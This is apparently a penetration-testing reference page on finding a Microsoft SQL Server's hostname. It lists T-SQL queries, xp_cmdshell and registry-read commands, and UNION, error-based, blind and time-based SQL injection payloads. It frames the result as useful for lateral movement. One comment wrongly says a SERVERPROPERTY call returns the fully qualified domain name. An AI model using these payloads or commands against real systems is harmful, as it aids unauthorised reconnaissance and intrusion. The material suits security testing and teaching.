---
title: Server Hostname
description: How to retrieve the server hostname in Microsoft SQL Server
category: Information Gathering
order: 6
tags: ["hostname", "server information", "reconnaissance"]
lastUpdated: 2023-03-15
---

## Server Hostname

Retrieving the server hostname during SQL injection testing can provide valuable information about the target environment. This information can be useful for network mapping, lateral movement, and understanding the server's environment.

### Methods to Retrieve Server Hostname

Microsoft SQL Server provides several functions and system views that can reveal the hostname:

#### Using @@SERVERNAME Global Variable

The simplest method is to use the `@@SERVERNAME` global variable:

```sql
SELECT @@SERVERNAME;
```

This returns the name of the SQL Server instance as defined during installation.

#### Using SERVERPROPERTY Function

The `SERVERPROPERTY` function provides more detailed server information:

```sql
-- Get the NetBIOS name of the server
SELECT SERVERPROPERTY('MachineName');

-- Get the fully qualified domain name (if available)
SELECT SERVERPROPERTY('ComputerNamePhysicalNetBIOS');
```

#### Using Host and Instance Information

For more comprehensive information:

```sql
-- Get combined server instance information
SELECT @@SERVERNAME AS ServerInstance, 
       SERVERPROPERTY('MachineName') AS HostName,
       SERVERPROPERTY('InstanceName') AS InstanceName;
```

### Additional System Information

In SQL Server, you can also retrieve other system information that may include or be related to the hostname:

#### System Environment Variables

```sql
-- Get all environment variables with xp_cmdshell
EXEC xp_cmdshell 'set';  -- Requires high privileges 

-- Get computer name
EXEC xp_cmdshell 'echo %COMPUTERNAME%';  -- Requires high privileges
```

#### System Information via Registry

```sql
-- Get registry information about the hostname (requires permissions)
EXEC master.dbo.xp_regread
    @rootkey = 'HKEY_LOCAL_MACHINE',
    @key = 'SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName',
    @value_name = 'ComputerName';
```

#### Network Configuration

```sql
-- Get network configuration information
SELECT * FROM sys.dm_exec_connections WHERE session_id = @@SPID;
```

### Practical Injection Examples

Here are examples of how to use these techniques in SQL injection scenarios:

#### Basic UNION Injection

```sql
' UNION SELECT @@SERVERNAME, NULL, NULL--
```

#### Error-based Extraction

```sql
' AND 1=CONVERT(int, @@SERVERNAME)--
```

#### Blind Extraction

```sql
' AND SUBSTRING(@@SERVERNAME, 1, 1) = 'S'--
```

#### Time-based Verification

```sql
' IF SUBSTRING(@@SERVERNAME, 1, 1) = 'S' WAITFOR DELAY '0:0:5'--
```

### Hostname Information in Different SQL Server Contexts

Different deployment types can affect what hostname information is available:

| Deployment Type | Hostname Considerations |
|-----------------|-------------------------|
| Standalone Server | @@SERVERNAME typically matches the Windows hostname |
| Named Instance | @@SERVERNAME includes instance name (e.g., SERVER\INSTANCE) |
| Clustered Instance | @@SERVERNAME may show the virtual network name |
| Docker Container | May show container ID or custom hostname |
| Azure SQL Database | Limited hostname information (@@SERVERNAME may be obscured) |

### Security Implications

Exposing the hostname can have security implications:
- Reveals internal naming conventions
- Might expose domain information
- Can help attackers target specific hosts in a network
- May reveal virtualization or containerization details

### Notes

1. Some hostname retrieval methods require elevated privileges
2. In cloud-hosted SQL Server instances, hostname information might be virtualized
3. SQL Server may return different formats of the hostname depending on the method used
4. The hostname information might be useful for correlating with other collected data for a comprehensive attack